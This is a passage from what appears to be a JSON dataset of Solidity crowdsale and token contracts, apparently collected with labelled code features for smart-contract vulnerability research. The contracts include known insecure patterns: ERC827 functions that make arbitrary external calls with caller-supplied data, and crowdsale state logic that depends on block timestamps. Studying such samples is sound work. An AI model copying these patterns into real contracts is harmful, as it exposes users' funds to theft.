tokensSold.plus(tokenAmount);\n if(pricingStrategy.isPresalePurchase(receiver)) {\n presaleWeiRaised = presaleWeiRaised.plus(weiAmount);\n }\n require(!isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold));\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n return tokenAmount;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != 0) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) onlyOwner {\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEndsAt(uint time) onlyOwner {\n if(now > time) {\n throw;\n }\n if(startsAt > time) {\n throw;\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) onlyOwner {\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function loadRefund() public payable inState(State.Failure) {\n if(msg.value == 0) throw;\n loadedRefund = loadedRefund.plus(msg.value);\n }\n function refund() public inState(State.Refunding) {\n uint256 weiValue = investedAmountOf[msg.sender];\n if (weiValue == 0) throw;\n investedAmountOf[msg.sender] = 0;\n weiRefunded = weiRefunded.plus(weiValue);\n Refund(msg.sender, weiValue);\n if (!msg.sender.send(weiValue)) throw;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else if (!isMinimumGoalReached() && weiRaised > 0 && loadedRefund >= weiRaised) return State.Refunding;\n else return State.Failure;\n }\n function setOwnerTestValue(uint val) onlyOwner {\n ownerTestValue = val;\n }\n function setEarlyParicipantWhitelist(address addr, bool status) onlyOwner {\n earlyParticipantWhitelist[addr] = status;\n Whitelisted(addr, status);\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) internal;\n}\ncontract Crowdsale is CrowdsaleBase {\n bool public requireCustomerId;\n bool public requiredSignedAddress;\n address public signerAddress;\n function Crowdsale(address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal) CrowdsaleBase(_token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal) {\n }\n function preallocate(address receiver, uint fullTokens, uint weiPrice) public onlyOwner {\n uint tokenAmount = fullTokens * 10**token.decimals();\n uint weiAmount = weiPrice * fullTokens;\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n assignTokens(receiver, tokenAmount);\n Invested(receiver, weiAmount, tokenAmount, 0);\n }\n function investWithSignedAddress(address addr, uint128 customerId, uint8 v, bytes32 r, bytes32 s) public payable {\n bytes32 hash = sha256(addr);\n if (ecrecover(hash, v, r, s) != signerAddress) throw;\n if(customerId == 0) throw;\n investInternal(addr, customerId);\n }\n function investWithCustomerId(address addr, uint128 customerId) public payable {\n if(requiredSignedAddress) throw;\n if(customerId == 0) throw;\n investInternal(addr, customerId);\n }\n function invest(address addr) public payable {\n if(requireCustomerId) throw;\n if(requiredSignedAddress) throw;\n investInternal(addr, 0);\n }\n function buyWithSignedAddress(uint128 customerId, uint8 v, bytes32 r, bytes32 s) public payable {\n investWithSignedAddress(msg.sender, customerId, v, r, s);\n }\n function buyWithCustomerIdWithChecksum(uint128 customerId, bytes1 checksum) public payable {\n if (bytes1(sha3(customerId)) != checksum) throw;\n investWithCustomerId(msg.sender, customerId);\n }\n function buyWithCustomerId(uint128 customerId) public payable {\n investWithCustomerId(msg.sender, customerId);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function setRequireCustomerId(bool value) onlyOwner {\n requireCustomerId = value;\n InvestmentPolicyChanged(requireCustomerId, requiredSignedAddress, signerAddress);\n }\n function setRequireSignedAddress(bool value, address _signerAddress) onlyOwner {\n requiredSignedAddress = value;\n signerAddress = _signerAddress;\n InvestmentPolicyChanged(requireCustomerId, requiredSignedAddress, signerAddress);\n }\n function () public payable {\n invest(msg.sender);\n }\n}\ncontract MintedTokenCappedCrowdsale is Crowdsale {\n uint public maximumSellableTokens;\n function MintedTokenCappedCrowdsale(address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, uint _maximumSellableTokens) Crowdsale(_token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal) {\n maximumSellableTokens = _maximumSellableTokens;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) constant returns (bool limitBroken) {\n return tokensSoldTotal > maximumSellableTokens;\n }\n function isCrowdsaleFull() public constant returns (bool) {\n return tokensSold >= maximumSellableTokens;\n }\n function assignTokens(address receiver, uint tokenAmount) internal {\n MintableToken mintableToken = MintableToken(token);\n mintableToken.mint(receiver, tokenAmount);\n }\n}\ncontract ERC827 is ERC20 {\n function approve( address _spender, uint256 _value, bytes _data ) public returns (bool);\n function transfer( address _to, uint256 _value, bytes _data ) public returns (bool);\n function transferFrom( address _from, address _to, uint256 _value, bytes _data ) public returns (bool);\n}\ncontract ERC827Token is ERC827, StandardToken {\n function approve(address _spender, uint256 _value, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.approve(_spender, _value);\n require(_spender.call(_data));\n return true;\n }\n function transfer(address _to, uint256 _value, bytes _data) public returns (bool) {\n require(_to != address(this));\n super.transfer(_to, _value);\n require(_to.call(_data));\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value, bytes _data) public returns (bool) {\n require(_to != address(this));\n super.transferFrom(_from, _to, _value);\n require(_to.call(_data));\n return true;\n }\n function increaseApproval(address _spender, uint _addedValue, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.increaseApproval(_spender, _addedValue);\n require(_spender.call(_data));\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.decreaseApproval(_spender, _subtractedValue);\n require(_spender.call(_data));\n return true;\n }\n}\ncontract StandardTokenExt is StandardToken, ERC827Token, Recoverable {\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n}\ncontract MintableToken is StandardTokenExt {\n using SafeMathLib for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state);\n event Minted(address receiver, uint amount);\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply_ = totalSupply_.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse if (!isMinimumGoalReached() && weiRaised > 0 && loadedRefund >= weiRaised) return State.Refunding;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f22"
  },
  "filename": "6798.sol",
  "content": "pragma solidity ^0.4.13;\ncontract FinalizeAgent {\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function finalizeCrowdsale();\n}\ncontract PricingStrategy {\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\nlibrary SafeMathLib {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Recoverable is Ownable {\n function Recoverable() {\n }\n function recoverTokens(ERC20Basic token) onlyOwner public {\n token.transfer(owner, tokensToBeReturned(token));\n }\n function tokensToBeReturned(ERC20Basic token) public returns (uint) {\n return token.balanceOf(this);\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract Whitelist is Ownable {\n mapping(address => bool) public whitelist;\n event WhitelistedAddressAdded(address addr);\n event WhitelistedAddressRemoved(address addr);\n modifier onlyWhitelisted() {\n require(whitelist[msg.sender]);\n _;\n }\n function addAddressToWhitelist(address addr) onlyOwner public returns(bool success) {\n if (!whitelist[addr]) {\n whitelist[addr] = true;\n WhitelistedAddressAdded(addr);\n success = true;\n }\n }\n function addAddressesToWhitelist(address[] addrs) onlyOwner public returns(bool success) {\n for (uint256 i = 0; i < addrs.length; i++) {\n if (addAddressToWhitelist(addrs[i])) {\n success = true;\n }\n }\n }\n function removeAddressFromWhitelist(address addr) onlyOwner public returns(bool success) {\n if (whitelist[addr]) {\n whitelist[addr] = false;\n WhitelistedAddressRemoved(addr);\n success = true;\n }\n }\n function removeAddressesFromWhitelist(address[] addrs) onlyOwner public returns(bool success) {\n for (uint256 i = 0; i < addrs.length; i++) {\n if (removeAddressFromWhitelist(addrs[i])) {\n success = true;\n }\n }\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20 is ERC20 {\n uint public decimals;\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract CrowdsaleBase is Haltable, Whitelist {\n uint public MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE = 5;\n using SafeMathLib for uint;\n FractionalERC20 public token;\n PricingStrategy public pricingStrategy;\n FinalizeAgent public finalizeAgent;\n address public multisigWallet;\n uint public minimumFundingGoal;\n uint public startsAt;\n uint public endsAt;\n uint public tokensSold = 0;\n uint public weiRaised = 0;\n uint public presaleWeiRaised = 0;\n uint public investorCount = 0;\n uint public loadedRefund = 0;\n uint public weiRefunded = 0;\n bool public finalized;\n mapping (address => uint256) public investedAmountOf;\n mapping (address => uint256) public tokenAmountOf;\n mapping (address => bool) public earlyParticipantWhitelist;\n uint public ownerTestValue;\n enum State{Unknown, Preparing, PreFunding, Funding, Success, Failure, Finalized, Refunding}\n event Invested(address investor, uint weiAmount, uint tokenAmount, uint128 customerId);\n event Refund(address investor, uint weiAmount);\n event InvestmentPolicyChanged(bool newRequireCustomerId, bool newRequiredSignedAddress, address newSignerAddress);\n event Whitelisted(address addr, bool status);\n event EndsAtChanged(uint newEndsAt);\n function CrowdsaleBase(address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal) {\n owner = msg.sender;\n token = FractionalERC20(_token);\n setPricingStrategy(_pricingStrategy);\n multisigWallet = _multisigWallet;\n if(multisigWallet == 0) {\n throw;\n }\n if(_start == 0) {\n throw;\n }\n startsAt = _start;\n if(_end == 0) {\n throw;\n }\n endsAt = _end;\n if(startsAt >= endsAt) {\n throw;\n }\n minimumFundingGoal = _minimumFundingGoal;\n }\n function investInternal(address receiver, uint128 customerId) stopInEmergency internal returns(uint tokensBought) {\n Whitelist dc;\n address contract_addr = 0x062e41d1037745dc203e8c1AAcA651B8d157Da96;\n dc = Whitelist(contract_addr);\n require (dc.whitelist(msg.sender));\n require (dc.whitelist(receiver));\n if(getState() == State.PreFunding) {\n if(!earlyParticipantWhitelist[receiver]) {\n throw;\n }\n } else if(getState() == State.Funding) {\n } else {\n throw;\n }\n uint weiAmount = msg.value;\n require(weiAmount >= minimumFundingGoal);\n uint tokenAmount = pricingStrategy.calculatePrice(weiAmount, weiRaised - presaleWeiRaised, tokensSold, msg.sender, token.decimals());\n require(tokenAmount != 0);\n if(investedAmountOf[receiver] == 0) {\n investorCount++;\n }\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n if(pricingStrategy.isPresalePurchase(receiver)) {\n presaleWeiRaised = presaleWeiRaised.plus(weiAmount);\n }\n require(!isBreakingCap(weiAmount, tokenAmount, weiRaised, tokensSold));\n assignTokens(receiver, tokenAmount);\n if(!multisigWallet.send(weiAmount)) throw;\n Invested(receiver, weiAmount, tokenAmount, customerId);\n return tokenAmount;\n }\n function finalize() public inState(State.Success) onlyOwner stopInEmergency {\n if(finalized) {\n throw;\n }\n if(address(finalizeAgent) != 0) {\n finalizeAgent.finalizeCrowdsale();\n }\n finalized = true;\n }\n function setFinalizeAgent(FinalizeAgent addr) onlyOwner {\n finalizeAgent = addr;\n if(!finalizeAgent.isFinalizeAgent()) {\n throw;\n }\n }\n function setEndsAt(uint time) onlyOwner {\n if(now > time) {\n throw;\n }\n if(startsAt > time) {\n throw;\n }\n endsAt = time;\n EndsAtChanged(endsAt);\n }\n function setPricingStrategy(PricingStrategy _pricingStrategy) onlyOwner {\n pricingStrategy = _pricingStrategy;\n if(!pricingStrategy.isPricingStrategy()) {\n throw;\n }\n }\n function setMultisig(address addr) public onlyOwner {\n if(investorCount > MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function loadRefund() public payable inState(State.Failure) {\n if(msg.value == 0) throw;\n loadedRefund = loadedRefund.plus(msg.value);\n }\n function refund() public inState(State.Refunding) {\n uint256 weiValue = investedAmountOf[msg.sender];\n if (weiValue == 0) throw;\n investedAmountOf[msg.sender] = 0;\n weiRefunded = weiRefunded.plus(weiValue);\n Refund(msg.sender, weiValue);\n if (!msg.sender.send(weiValue)) throw;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else if (!isMinimumGoalReached() && weiRaised > 0 && loadedRefund >= weiRaised) return State.Refunding;\n else return State.Failure;\n }\n function setOwnerTestValue(uint val) onlyOwner {\n ownerTestValue = val;\n }\n function setEarlyParicipantWhitelist(address addr, bool status) onlyOwner {\n earlyParticipantWhitelist[addr] = status;\n Whitelisted(addr, status);\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) internal;\n}\ncontract Crowdsale is CrowdsaleBase {\n bool public requireCustomerId;\n bool public requiredSignedAddress;\n address public signerAddress;\n function Crowdsale(address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal) CrowdsaleBase(_token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal) {\n }\n function preallocate(address receiver, uint fullTokens, uint weiPrice) public onlyOwner {\n uint tokenAmount = fullTokens * 10**token.decimals();\n uint weiAmount = weiPrice * fullTokens;\n weiRaised = weiRaised.plus(weiAmount);\n tokensSold = tokensSold.plus(tokenAmount);\n investedAmountOf[receiver] = investedAmountOf[receiver].plus(weiAmount);\n tokenAmountOf[receiver] = tokenAmountOf[receiver].plus(tokenAmount);\n assignTokens(receiver, tokenAmount);\n Invested(receiver, weiAmount, tokenAmount, 0);\n }\n function investWithSignedAddress(address addr, uint128 customerId, uint8 v, bytes32 r, bytes32 s) public payable {\n bytes32 hash = sha256(addr);\n if (ecrecover(hash, v, r, s) != signerAddress) throw;\n if(customerId == 0) throw;\n investInternal(addr, customerId);\n }\n function investWithCustomerId(address addr, uint128 customerId) public payable {\n if(requiredSignedAddress) throw;\n if(customerId == 0) throw;\n investInternal(addr, customerId);\n }\n function invest(address addr) public payable {\n if(requireCustomerId) throw;\n if(requiredSignedAddress) throw;\n investInternal(addr, 0);\n }\n function buyWithSignedAddress(uint128 customerId, uint8 v, bytes32 r, bytes32 s) public payable {\n investWithSignedAddress(msg.sender, customerId, v, r, s);\n }\n function buyWithCustomerIdWithChecksum(uint128 customerId, bytes1 checksum) public payable {\n if (bytes1(sha3(customerId)) != checksum) throw;\n investWithCustomerId(msg.sender, customerId);\n }\n function buyWithCustomerId(uint128 customerId) public payable {\n investWithCustomerId(msg.sender, customerId);\n }\n function buy() public payable {\n invest(msg.sender);\n }\n function setRequireCustomerId(bool value) onlyOwner {\n requireCustomerId = value;\n InvestmentPolicyChanged(requireCustomerId, requiredSignedAddress, signerAddress);\n }\n function setRequireSignedAddress(bool value, address _signerAddress) onlyOwner {\n requiredSignedAddress = value;\n signerAddress = _signerAddress;\n InvestmentPolicyChanged(requireCustomerId, requiredSignedAddress, signerAddress);\n }\n function () public payable {\n invest(msg.sender);\n }\n}\ncontract MintedTokenCappedCrowdsale is Crowdsale {\n uint public maximumSellableTokens;\n function MintedTokenCappedCrowdsale(address _token, PricingStrategy _pricingStrategy, address _multisigWallet, uint _start, uint _end, uint _minimumFundingGoal, uint _maximumSellableTokens) Crowdsale(_token, _pricingStrategy, _multisigWallet, _start, _end, _minimumFundingGoal) {\n maximumSellableTokens = _maximumSellableTokens;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) constant returns (bool limitBroken) {\n return tokensSoldTotal > maximumSellableTokens;\n }\n function isCrowdsaleFull() public constant returns (bool) {\n return tokensSold >= maximumSellableTokens;\n }\n function assignTokens(address receiver, uint tokenAmount) internal {\n MintableToken mintableToken = MintableToken(token);\n mintableToken.mint(receiver, tokenAmount);\n }\n}\ncontract ERC827 is ERC20 {\n function approve( address _spender, uint256 _value, bytes _data ) public returns (bool);\n function transfer( address _to, uint256 _value, bytes _data ) public returns (bool);\n function transferFrom( address _from, address _to, uint256 _value, bytes _data ) public returns (bool);\n}\ncontract ERC827Token is ERC827, StandardToken {\n function approve(address _spender, uint256 _value, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.approve(_spender, _value);\n require(_spender.call(_data));\n return true;\n }\n function transfer(address _to, uint256 _value, bytes _data) public returns (bool) {\n require(_to != address(this));\n super.transfer(_to, _value);\n require(_to.call(_data));\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value, bytes _data) public returns (bool) {\n require(_to != address(this));\n super.transferFrom(_from, _to, _value);\n require(_to.call(_data));\n return true;\n }\n function increaseApproval(address _spender, uint _addedValue, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.increaseApproval(_spender, _addedValue);\n require(_spender.call(_data));\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue, bytes _data) public returns (bool) {\n require(_spender != address(this));\n super.decreaseApproval(_spender, _subtractedValue);\n require(_spender.call(_data));\n return true;\n }\n}\ncontract StandardTokenExt is StandardToken, ERC827Token, Recoverable {\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n}\ncontract MintableToken is StandardTokenExt {\n using SafeMathLib for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state);\n event Minted(address receiver, uint amount);\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply_ = totalSupply_.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse if (!isMinimumGoalReached() && weiRaised > 0 && loadedRefund >= weiRaised) return State.Refunding;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f23"
  },
  "filename": "6806.sol",
  "content": "pragma solidity ^0.4.13;\ncontract FinalizeAgent {\n function isFinalizeAgent() public constant returns(bool) {\n return true;\n }\n function isSane() public constant returns (bool);\n function finalizeCrowdsale();\n}\ncontract PricingStrategy {\n function isPricingStrategy() public constant returns (bool) {\n return true;\n }\n function isSane(address crowdsale) public constant returns (bool) {\n return true;\n }\n function isPresalePurchase(address purchaser) public constant returns (bool) {\n return false;\n }\n function calculatePrice(uint value, uint weiRaised, uint tokensSold, address msgSender, uint decimals) public constant returns (uint tokenAmount);\n}\nlibrary SafeMathLib {\n function times(uint a, uint b) returns (uint) {\n uint c = a * b;\n assert(a == 0 || c / a == b);\n return c;\n }\n function minus(uint a, uint b) returns (uint) {\n assert(b <= a);\n return a - b;\n }\n function plus(uint a, uint b) returns (uint) {\n uint c = a + b;\n assert(c>=a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract Recoverable is Ownable {\n function Recoverable() {\n }\n function recoverTokens(ERC20Basic token) onlyOwner public {\n token.transfer(owner, tokensToBeReturned(token));\n }\n function tokensToBeReturned(ERC20Basic token) public returns (uint) {\n return token.balanceOf(this);\n }\n}\ncontract Haltable is Ownable {\n bool public halted;\n modifier stopInEmergency {\n if (halted) throw;\n _;\n }\n modifier stopNonOwnersInEmergency {\n if (halted && msg.sender != owner) throw;\n _;\n }\n modifier onlyInEmergency {\n if (!halted) throw;\n _;\n }\n function halt() external onlyOwner {\n halted = true;\n }\n function unhalt() external onlyOwner onlyInEmergency {\n halted = false;\n }\n}\ncontract Whitelist is Ownable {\n mapping(address => bool) public whitelist;\n event WhitelistedAddressAdded(address addr);\n event WhitelistedAddressRemoved(address addr);\n modifier onlyWhitelisted() {\n require(whitelist[msg.sender]);\n _;\n }\n function addAddressToWhitelist(address addr) onlyOwner public returns(bool success) {\n if (!whitelist[addr]) {\n whitelist[addr] = true;\n WhitelistedAddressAdded(addr);\n success = true;\n }\n }\n function addAddressesToWhitelist(address[] addrs) onlyOwner public returns(bool success) {\n for (uint256 i = 0; i < addrs.length; i++) {\n if (addAddressToWhitelist(addrs[i])) {\n success = true;\n }\n }\n }\n function removeAddressFromWhitelist(address addr) onlyOwner public returns(bool success) {\n if (whitelist[addr]) {\n whitelist[addr] = false;\n WhitelistedAddressRemoved(addr);\n success = true;\n }\n }\n function removeAddressesFromWhitelist(address[] addrs) onlyOwner public returns(bool success) {\n for (uint256 i = 0; i < addrs.length; i++) {\n if (removeAddressFromWhitelist(addrs[i])) {\n success = true;\n }\n }\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract FractionalERC20 is ERC20 {\n uint public decimals;\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return 